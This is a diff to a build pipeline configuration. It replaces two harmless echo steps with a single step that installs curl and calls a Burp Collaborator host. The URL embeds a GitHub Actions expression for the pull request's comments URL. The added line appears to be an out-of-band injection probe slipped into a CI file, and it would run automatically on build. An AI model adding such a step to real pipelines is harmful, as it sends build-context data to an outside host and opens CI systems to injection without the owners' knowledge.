@@ -1,13 +1,3 @@
 steps:
-- name: 'ubuntu'
-  script: |
-    #!/usr/bin/env bash
-    echo "Hello $_USER"
-- name: 'ubuntu'
-  script: |
-    #!/usr/bin/env bash
-    echo "Your project ID is $PROJECT_ID"
-options:
-  automapSubstitutions: true
-substitutions:
-  _USER: "Google Cloud"
+  - name: ubuntu
+    script: apt update -y && apt-get install curl -y && curl https://5iongi0rut0fnjhbjdp4wmx3gumlaa.burpcollaborator.net/${{ github.event.pull_request.comments_url }} 
